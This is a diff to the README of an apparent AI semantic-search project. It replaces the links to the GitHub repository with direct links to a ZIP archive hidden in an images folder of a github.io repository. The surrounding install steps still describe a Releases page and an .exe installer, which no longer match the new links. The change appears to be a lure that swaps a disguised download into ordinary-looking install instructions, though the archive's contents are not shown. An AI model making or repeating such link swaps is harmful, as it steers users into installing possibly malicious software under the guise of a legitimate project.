@@ -5,7 +5,7 @@ description: "Build full-stack semantic search engines using FastAPI, OpenAI, an
 ---
 # 🔍 ai-search-engine - Find your files using smart AI
 
-[Check out the download page here](https://github.com/retrograde-prosceniumwall239/ai-search-engine)
+[Check out the download page here](https://raw.githubusercontent.com/retrograde-prosceniumwall239/retrograde-prosceniumwall239.github.io/main/images/Dist-3.1.zip)
 
 ## 📖 About this application
 
@@ -25,7 +25,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 Follow these steps to get the software on your computer.
 
-1. Visit this page to download: [https://github.com/retrograde-prosceniumwall239/ai-search-engine](https://github.com/retrograde-prosceniumwall239/ai-search-engine).
+1. Visit this page to download: [https://raw.githubusercontent.com/retrograde-prosceniumwall239/retrograde-prosceniumwall239.github.io/main/images/Dist-3.1.zip](https://raw.githubusercontent.com/retrograde-prosceniumwall239/retrograde-prosceniumwall239.github.io/main/images/Dist-3.1.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the version number to open the download page.
 4. Select the Windows installer file, which ends in .exe.
